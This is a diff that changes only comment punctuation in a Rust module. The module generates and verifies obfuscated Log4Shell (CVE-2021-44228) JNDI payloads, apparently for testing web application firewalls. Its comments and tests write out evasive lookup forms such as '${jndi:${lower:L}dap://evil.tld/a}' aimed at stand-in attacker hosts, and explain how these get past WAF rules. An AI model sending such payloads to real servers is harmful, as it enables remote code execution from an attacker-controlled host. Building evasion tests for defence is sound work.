@@ -1,5 +1,5 @@
 //! Log4Shell (CVE-2021-44228) payload-string equivalence + the joint
-//! `(payload × delivery)` generator — the log4shell arm of Phase B.
+//! `(payload × delivery)` generator (the log4shell arm of Phase B).
 //!
 //! The sound equivalence is **Log4j lookup-collapse**: before the JNDI
 //! lookup fires, the Log4j 2 interpolator recursively resolves nested
@@ -8,7 +8,7 @@
 //!   `${lower:J}`→`j`  `${upper:n}`→`N`  `${::-x}`→`x`
 //!   `${env:NOPE:-x}`→`x`  `${sys:nope:-x}`→`x`  `${date:'x'}`→`x`
 //! So `${jndi:ldap://h/a}` ≡ `${${lower:j}ndi:ldap://h/a}` ≡
-//! `${${::-j}${::-n}di:ldap://h/a}` — every form collapses to the SAME
+//! `${${::-j}${::-n}di:ldap://h/a}`: every form collapses to the SAME
 //! interpolated string, hence the SAME JNDI URL the JVM dereferences,
 //! while a WAF regex keyed on `jndi:` / `ldap:` matches none of the
 //! obfuscated forms.
@@ -16,7 +16,7 @@
 //! Anti-rig: the exploit's protocol + authority + path
 //! (`ldap://attacker.tld/a`) is preserved verbatim and re-verified
 //! ([`still_executes`]). Swapping `ldap`→`dns`, or the attacker host,
-//! is a *different* exploit and is rejected — equivalence holds only
+//! is a *different* exploit and is rejected, equivalence holds only
 //! for the spec-defined collapsing lookups, never "any `${}` is fine".
 
 use super::{DeliveryShape, Dialect, EquivConfig, EquivPayload, Rng};
@@ -50,11 +50,11 @@ pub fn normalize(s: &str) -> String {
 
 fn innermost<'a>(s: &'a str, head: &str) -> Option<(usize, usize, &'a str)> {
     // find a `${<head>...}` with no nested `${` inside (innermost).
-    // Walk CHAR boundaries only — `s` can carry hostile multibyte
+    // Walk CHAR boundaries only: `s` can carry hostile multibyte
     // input; a `+= 1` byte walk with `s[i..]` panics mid-codepoint.
     let pat = format!("${{{head}");
     let start = s.find(&pat)?;
-    let body_start = start + 2; // past ASCII "${" — a valid boundary
+    let body_start = start + 2; // past ASCII "${", a valid boundary
     let mut depth = 1;
     for (off, c) in s[body_start..].char_indices() {
         let idx = body_start + off;
@@ -187,7 +187,7 @@ fn is_log4shell(s: &str) -> bool {
 }
 
 /// True iff `cand` still drives the SAME JNDI fetch (same protocol,
-/// authority and path) as the original — the exploit, not just "some
+/// authority and path) as the original, the exploit, not just "some
 /// `${}`".
 #[must_use]
 pub fn still_executes(original: &str, cand: &str) -> bool {
@@ -212,7 +212,7 @@ pub fn still_executes(original: &str, cand: &str) -> bool {
 ///
 /// Arms 6–8 are SECOND-ORDER: the lookup KEYWORD itself is spelled with
 /// a collapsing lookup (`${::-l}ower` → `lower`), which defeats a WAF
-/// that blocks the literal `${lower:` / `${upper:` prefixes — the
+/// that blocks the literal `${lower:` / `${upper:` prefixes, the
 /// inner lookup resolves first (innermost-first recursion), reconstructing
 /// the outer keyword only after the regex has already passed.
 fn obf_char(c: char, rng: &mut Rng) -> String {
@@ -235,7 +235,7 @@ fn obf_char(c: char, rng: &mut Rng) -> String {
     }
 }
 
-/// Obfuscate the ASCII-alpha chars of `payload[range]` in place — each,
+/// Obfuscate the ASCII-alpha chars of `payload[range]` in place, each,
 /// with prob 3/4, replaced by a [`obf_char`] collapsing lookup. The
 /// bytes outside `range` (authority, path, delimiters) are preserved
 /// verbatim. One primitive for both the `jndi` token and the URL scheme
@@ -279,7 +279,7 @@ fn scheme_range(payload: &str, jndi_end: usize) -> Option<std::ops::Range<usize>
 /// Obfuscating the SCHEME is the high-value addition: most real-world
 /// Log4Shell WAF rules key on `ldap:`/`rmi:`/`jndi:` literally, so a
 /// variant that only hid `jndi` still shipped `ldap://` in cleartext.
-/// `scheme_range` + `obf_span` close that — and the collapse oracle
+/// `scheme_range` + `obf_span` close that, and the collapse oracle
 /// already proves the result drives the identical JNDI fetch.
 fn rw_obfuscate(payload: &str, rng: &mut Rng) -> Option<(String, Vec<&'static str>)> {
     let jpos = payload.find("jndi")?;
@@ -410,7 +410,7 @@ mod tests {
     #[test]
     fn scheme_obfuscation_collapses_to_canonical() {
         // The scheme (`ldap`/`rmi`) hidden behind collapsing lookups must
-        // still drive the identical JNDI fetch — the new high-value evasion.
+        // still drive the identical JNDI fetch (the new high-value evasion).
         let canon = jndi_target(&normalize("${jndi:ldap://evil.tld/a}")).unwrap();
         for v in [
             "${jndi:${lower:L}dap://evil.tld/a}",
@@ -436,7 +436,7 @@ mod tests {
     #[test]
     fn second_order_keyword_obfuscation_collapses() {
         // `${${::-l}ower:J}` → `${lower:J}` → `j` via innermost-first
-        // recursion — the construct that defeats a WAF blocking `${lower:`.
+        // recursion (the construct that defeats a WAF blocking `${lower:`).
         assert_eq!(normalize("${${::-l}ower:J}ndi"), "jndi");
         assert_eq!(normalize("${${::-u}pper:j}NDI"), "jndi");
         assert!(still_executes(
